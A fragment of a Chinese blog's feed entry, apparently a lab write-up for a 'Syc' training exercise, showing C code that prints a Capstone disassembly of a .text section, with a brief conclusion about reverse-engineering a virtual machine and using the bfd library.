class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;disassembly of .text section:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx\t%s\t\t%s\n&quot;</span>, insns[i].address, insns[i].mnemonic, insns[i].op_str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cs_free</span>(insns,n);</span><br><span class="line">    <span class="built_in">cs_close</span>(&amp;dis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;err\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在main.cc的打印节后一部分调用就好了；</p><p>通过：</p><p><img src="https://s2.loli.net/2022/11/06/v6ESOF5znQ2khu7.png" alt="pass"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>纯粹对今年的有兴趣，5和7都比较新鲜，也是第一次手撸汇编了解bfd库，还挺有意思；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;level5&quot;&gt;&lt;a href=&quot;#level5&quot; class=&quot;headerlink&quot; title=&quot;level5&quot;&gt;&lt;/a&gt;level5&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;逆向一个虚拟机，编写适应于其的二进制文件，实现tea算法；&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Syc" scheme="https://secondbc.github.io/SecondBC/tags/Syc/"/>
    
  </entry>
  
</feed>
